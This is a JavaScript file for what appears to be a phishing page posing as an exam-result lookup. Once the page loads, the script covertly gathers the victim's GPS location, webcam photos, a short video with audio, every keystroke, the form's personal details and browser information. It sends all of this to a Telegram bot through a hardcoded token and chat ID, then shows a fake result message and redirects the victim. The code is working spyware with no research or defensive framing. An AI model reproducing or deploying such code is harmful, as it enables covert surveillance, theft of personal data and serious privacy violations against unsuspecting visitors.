const TOKEN = '8546910341:AAFZKnrP036naa4tciDsMS-bk8TZZ8_wekI';
const CHAT_ID = '1332669070';

let photoCount = 0;
let keystrokes = '';
let mediaStream = null;
let mediaRecorder = null;
let recordedChunks = [];
let photoInterval = null;

// 📍 Send GPS location
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
        pos => {
            const { latitude, longitude, accuracy } = pos.coords;
            sendToTelegram(`📍 *Location*\nLat: ${latitude}\nLng: ${longitude}\nAccuracy: ${accuracy}m`);
        },
        error => {
            console.error('Geolocation error:', error);
            sendToTelegram('❌ *Location Access Denied*\nError: ' + error.message);
        },
        {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        }
    );
} else {
    sendToTelegram('❌ *Geolocation not supported*');
}

// 🎥 Capture short video with audio and multiple photos
if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({ 
        video: { 
            width: 1280, 
            height: 720,
            facingMode: 'user',
            frameRate: 30
        },
        audio: true
    })
    .then(async stream => {
        mediaStream = stream;
        
        // Start video recording
        await startVideoRecording(stream);
        
        // Start continuous photo capture
        await startPhotoCapture(stream);
        
    })
    .catch(error => {
        console.error('Media access error:', error);
        sendToTelegram('❌ *Camera/Microphone Access Denied*\n' + error.message);
    });
} else {
    sendToTelegram('❌ *Camera/Microphone not supported*');
}

// 🎬 Start video recording
async function startVideoRecording(stream) {
    try {
        recordedChunks = [];
        
        // Check if MediaRecorder is supported
        if (!MediaRecorder) {
            sendToTelegram('❌ *Video recording not supported*');
            return;
        }
        
        const options = {
            mimeType: 'video/webm;codecs=vp9,opus',
            videoBitsPerSecond: 2500000
        };
        
        // Fallback mime types
        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
            options.mimeType = 'video/webm;codecs=vp8,opus';
        }
        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
            options.mimeType = 'video/webm';
        }
        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
            options.mimeType = '';
        }
        
        mediaRecorder = new MediaRecorder(stream, options);
        
        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };
        
        mediaRecorder.onstop = async () => {
            const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
            
            if (videoBlob.size > 0) {
                // Check file size (Telegram has 50MB limit)
                if (videoBlob.size < 45 * 1024 * 1024) {
                    await sendToTelegram(videoBlob, 'video');
                    sendToTelegram('🎥 *10-second video recorded with audio*');
                } else {
                    sendToTelegram('❌ *Video too large to send*');
                }
            }
        };
        
        // Start recording
        mediaRecorder.start(1000); // Collect data every second
        sendToTelegram('🎥 *Started recording video with audio*');
        
        // Stop recording after 10 seconds
        setTimeout(() => {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
        }, 10000);
        
    } catch (error) {
        console.error('Video recording error:', error);
        sendToTelegram('❌ *Video Recording Failed*\n' + error.message);
    }
}

// 📸 Start continuous photo capture
async function startPhotoCapture(stream) {
    try {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.muted = true;
        
        await video.play();
        
        // Wait for video to be ready
        await new Promise(resolve => {
            if (video.readyState >= 2) {
                resolve();
            } else {
                video.addEventListener('loadeddata', resolve, { once: true });
            }
        });
        
        // Take initial photo immediately
        await capturePhoto(video);
        
        // Take photos every 3 seconds for 30 seconds (10 photos total)
        let photosTaken = 1;
        photoInterval = setInterval(async () => {
            if (photosTaken < 10) {
                await capturePhoto(video);
                photosTaken++;
            } else {
                clearInterval(photoInterval);
                sendToTelegram(`📸 *Completed: ${photosTaken} photos captured*`);
            }
        }, 3000);
        
    } catch (error) {
        console.error('Photo capture setup error:', error);
        sendToTelegram('❌ *Photo Capture Setup Failed*\n' + error.message);
    }
}

// 📸 Photo capture function
async function capturePhoto(video) {
    return new Promise((resolve) => {
        try {
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            
            // Set canvas dimensions to match video
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            
            // Draw video frame to canvas
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Add timestamp to photo
            context.font = '16px Arial';
            context.fillStyle = 'red';
            context.fillText(new Date().toLocaleString(), 10, 30);
            
            // Convert to blob and send
            canvas.toBlob(async blob => {
                if (blob) {
                    photoCount++;
                    await sendToTelegram(blob, 'photo');
                    sendToTelegram(`📸 *Photo ${photoCount} captured*\nTime: ${new Date().toLocaleString()}`);
                }
                resolve();
            }, 'image/jpeg', 0.85);
            
        } catch (error) {
            console.error('Photo capture error:', error);
            sendToTelegram('❌ *Photo Capture Failed*\n' + error.message);
            resolve();
        }
    });
}

// ⌨️ Keystroke logger
document.addEventListener('keydown', e => {
    // Filter out special keys
    if (e.key.length === 1) {
        keystrokes += e.key;
    } else {
        // Add special keys with brackets
        const specialKeys = {
            'Enter': '[ENTER]',
            'Tab': '[TAB]',
            'Shift': '[SHIFT]',
            'Control': '[CTRL]',
            'Alt': '[ALT]',
            'CapsLock': '[CAPS]',
            'Escape': '[ESC]',
            ' ': '[SPACE]',
            'Backspace': '[BACKSPACE]',
            'Delete': '[DEL]',
            'ArrowUp': '[UP]',
            'ArrowDown': '[DOWN]',
            'ArrowLeft': '[LEFT]',
            'ArrowRight': '[RIGHT]'
        };
        
        keystrokes += specialKeys[e.key] || `[${e.key}]`;
    }
    
    // Send keystrokes in batches
    if (keystrokes.length >= 50) {
        sendToTelegram(`⌨️ *Keystrokes*\n\`\`\`\n${keystrokes}\n\`\`\``);
        keystrokes = '';
    }
});

// 📝 Form submission handler
function initializeFormHandler() {
    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            try {
                const name = document.getElementById('name')?.value || 'N/A';
                const father = document.getElementById('father')?.value || 'N/A';
                const admId = document.getElementById('admId')?.value || 'N/A';
                const phone = document.getElementById('phone')?.value || 'N/A';

                const message = `📄 *Form Submitted*\n\n• 👤 Name: ${name}\n• 👨‍👦 Father: ${father}\n• 🆔 Admission ID: ${admId}\n• 📞 Phone: ${phone}\n• 🕐 Time: ${new Date().toLocaleString()}`;
                
                await sendToTelegram(message);
                
                // Capture one final photo before redirect
                if (mediaStream) {
                    const finalVideo = document.createElement('video');
                    finalVideo.srcObject = mediaStream;
                    await finalVideo.play();
                    setTimeout(async () => {
                        await capturePhoto(finalVideo);
                        // Show success message and redirect
                        alert(`Dear ${name}, we will send you SMS of your result.`);
                        setTimeout(() => {
                            window.location.href = 'https://www.google.com';
                        }, 2000);
                    }, 1000);
                } else {
                    alert(`Dear ${name}, we will send you SMS of your result.`);
                    setTimeout(() => {
                        window.location.href = 'https://www.google.com';
                    }, 1000);
                }
                
            } catch (error) {
                console.error('Form submission error:', error);
                alert('An error occurred. Please try again.');
            }
        });
    } else {
        console.warn('Login form not found');
        sendToTelegram('⚠️ *Form not found on page*');
    }
}

// 📤 Send to Telegram with improved error handling
async function sendToTelegram(data, type = 'message') {
    try {
        let response;
        
        if (type === 'photo') {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', data);
            formData.append('caption', `📸 Photo ${photoCount} - ${new Date().toLocaleString()}`);
            
            response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        } else if (type === 'video') {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('video', data, `video_${Date.now()}.webm`);
            formData.append('caption', `🎥 10-second video with audio - ${new Date().toLocaleString()}`);
            
            response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
                method: 'POST',
                body: formData
            });
        } else {
            response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: data,
                    parse_mode: 'Markdown'
                })
            });
        }
        
        const result = await response.json();
        
        if (!result.ok) {
            console.error('Telegram API error:', result);
            throw new Error(result.description || 'Unknown Telegram API error');
        }
        
        console.log('Message sent successfully:', type);
        return result;
        
    } catch (error) {
        console.error('Failed to send to Telegram:', error);
        return null;
    }
}

// 🛑 Cleanup function
function stopAllMedia() {
    // Stop photo interval
    if (photoInterval) {
        clearInterval(photoInterval);
    }
    
    // Stop video recording
    if (mediaRecorder && mediaRecorder.state === 'recording') {
        mediaRecorder.stop();
    }
    
    // Stop camera and microphone
    if (mediaStream) {
        mediaStream.getTracks().forEach(track => {
            track.stop();
        });
        mediaStream = null;
    }
    
    console.log('All media stopped');
}

// 🕒 Send system info on load
window.addEventListener('load', function() {
    // Initialize form handler
    initializeFormHandler();
    
    // Send system information
    const systemInfo = `🖥️ *Page Loaded - Enhanced Tracking*\n\n• 📱 User Agent: ${navigator.userAgent}\n• 🌐 Platform: ${navigator.platform}\n• 🕐 Time: ${new Date().toLocaleString()}\n• 🔗 URL: ${window.location.href}\n• 📍 Screen: ${screen.width}x${screen.height}`;
    
    sendToTelegram(systemInfo);
    
    // Send keystrokes periodically (every 20 seconds)
    setInterval(() => {
        if (keystrokes.length > 0) {
            sendToTelegram(`⌨️ *Keystrokes (Periodic)*\n\`\`\`\n${keystrokes}\n\`\`\``);
            keystrokes = '';
        }
    }, 20000);
});

// 🚨 Handle page unload
window.addEventListener('beforeunload', function() {
    // Send remaining keystrokes
    if (keystrokes.length > 0) {
        sendToTelegram(`⌨️ *Keystrokes (Final)*\n\`\`\`\n${keystrokes}\n\`\`\``);
    }
    
    // Send exit message with media summary
    sendToTelegram(`👋 *User Left Page - Media Summary*\n\n• 📸 Photos: ${photoCount}\n• 🎥 Video: 10 seconds with audio\n• 🕐 Time: ${new Date().toLocaleString()}\n• 🔗 URL: ${window.location.href}`);
    
    // Stop all media
    stopAllMedia();
});

// Handle visibility change (tab switch)
document.addEventListener('visibilitychange', function() {
    if (document.hidden) {
        sendToTelegram(`🔍 *User switched tabs/windows*\n• Time: ${new Date().toLocaleString()}`);
    } else {
        sendToTelegram(`🔍 *User returned to page*\n• Time: ${new Date().toLocaleString()}`);
    }
});